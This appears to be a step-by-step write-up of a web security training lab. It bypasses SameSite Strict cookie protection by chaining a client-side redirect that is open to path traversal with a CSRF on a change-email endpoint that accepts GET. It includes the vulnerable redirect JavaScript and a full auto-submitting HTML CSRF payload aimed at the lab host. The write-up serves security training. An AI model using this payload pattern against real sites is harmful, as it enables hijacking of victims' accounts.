# Lab: SameSite Strict bypass via client-side redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

# Step 1 Find a client-side redirect

To eventually bypass the samesite strict setting I need to find a redirect happening somewhere on the webapp that is also vulnerable. I find one such vulnerability in the comment confirmation functionality on the blog. 

## Making a blog post

![image](https://user-images.githubusercontent.com/83407557/210927606-bc2c048c-3b9f-4a29-aa32-81eaa80083c2.png)

## Getting a post comment confirmation request

![image](https://user-images.githubusercontent.com/83407557/210927912-2e298213-721d-43a8-9a04-31be423f3905.png)

## Getting redirected back to the post I commented on:

![image](https://user-images.githubusercontent.com/83407557/210927988-28bf7667-149f-48bc-8180-16632476d813.png)

## Viewing the HTTP history

I can see the javascript that is being run using the postId parameter on the confirmation request:

![image](https://user-images.githubusercontent.com/83407557/210928166-1ca72916-198d-48bc-8ecb-13b521c99710.png)

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

# Step 2 Verify /post/comment/confirmation is vulnerable

With this in mind, I want to see if I can craft a link using the confirmation page, to go to my-account instead of a blog post:

https://0a8200080305b07bc72812d6000d00af.web-security-academy.net/post/comment/confirmation?postId=../my-account

![image](https://user-images.githubusercontent.com/83407557/210930294-5ec69021-3dae-457d-af24-051a0eca7119.png)

Which goes to my account, instead of an intended blog-post:

![image](https://user-images.githubusercontent.com/83407557/210930366-99fccf8a-7fda-4de0-a026-c1cf4151bca3.png)


# Step 3 Find a CSRF vulnerability

I want to capture the change email feature

![image](https://user-images.githubusercontent.com/83407557/210930581-2074acb7-21b8-4ced-b777-91e0c5815d70.png)

And change the request method, to see if it can be done using a GET request instead of a POST request:

![image](https://user-images.githubusercontent.com/83407557/210930722-b4e3dad4-e8c0-401d-9d7b-07e24d9a3d8f.png)

I also take note of the request being sent

```
/my-account/change-email?email=test%40test.com&submit=1
```
and see that the GET request still changes my email:

![image](https://user-images.githubusercontent.com/83407557/210930884-3b63c350-0f26-4927-b90e-fd7c1d6bd706.png)

# Step 4 Create a CSRF POC

I go back into my HTTP history and find the comment confirmation page that was vulnerable:

![image](https://user-images.githubusercontent.com/83407557/210931059-6fea479a-9d32-4189-a972-579b39338182.png)

I add the GET request that I found could change the email and add it in:

![image](https://user-images.githubusercontent.com/83407557/210931155-63444946-9026-4546-ae57-c914e6e37619.png)

Then I add an auto-submit script and url encode the url, making the full payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a8200080305b07bc72812d6000d00af.web-security-academy.net/post/comment/confirmation">
      <input type="hidden" name="postId" value="&#46;&#46;&#47;my&#45;account&#47;change&#45;email&#63;email&#61;test&#64;test&#46;com&amp;submit&#61;1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
# Step 5 Host exploit on attack-server and test

First I update my email, so that I will be able to see the change if it happens:

![image](https://user-images.githubusercontent.com/83407557/210931435-4aebd9b9-3c22-4b2d-bfac-4dfaabc1881a.png)

next I upload my CSRF payload to my attack server:

![image](https://user-images.githubusercontent.com/83407557/210932201-525af4d4-656f-42a2-8faa-8a44ff6ee00e.png)

I store it and click view exploit, which changes my email:

![image](https://user-images.githubusercontent.com/83407557/210932124-77025c32-beec-4d35-a9ac-1460144fcf4e.png)

# Step 6 Send exploit to victim

I send this exploit to the victim

![image](https://user-images.githubusercontent.com/83407557/210932257-bbb1bf6a-630f-48e4-834e-8b303864b7a0.png)

which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210932310-ff672c6c-3da4-485b-888e-0c3af0f07439.png)

